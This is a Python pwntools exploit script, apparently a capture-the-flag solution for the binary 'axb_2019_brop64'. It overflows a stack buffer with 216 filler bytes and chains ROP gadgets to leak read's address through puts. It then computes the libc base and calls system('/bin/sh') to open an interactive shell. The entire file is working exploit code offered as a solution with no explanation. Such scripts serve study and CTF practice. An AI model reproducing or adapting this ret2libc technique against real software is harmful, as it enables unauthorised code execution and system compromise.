from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

elf = ELF('./axb_2019_brop64')
# libc = ELF('./lib/i386-linux-gnu/libc-2.23.so')
# libc = ELF('./lib/x86_64-linux-gnu/libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

prdi = 0x0000000000400963 #: pop rdi ; ret
prsi = 0x0000000000400961 #: pop rsi ; pop r15 ; ret
prdx = 0

read_got = elf.got['read']
puts_plt = elf.plt['puts']
main = elf.sym['main']

io = process('./axb_2019_brop64')


payload = b'a'*216 + p64(prdi)+p64(read_got)
payload += p64(puts_plt)
payload += p64(main)
io.sendafter('me:', payload)

addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success(hex(addr))

libc_base = addr - libc.sym['read']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.success(hex(system))
log.success(hex(binsh))

payload = b'a'*216 + p64(prdi)+p64(binsh)
payload += p64(prsi) + p64(0)*2
payload += p64(system)
payload += p64(main)
gdb.attach(io)
io.sendafter('me:', payload)

io.interactive()
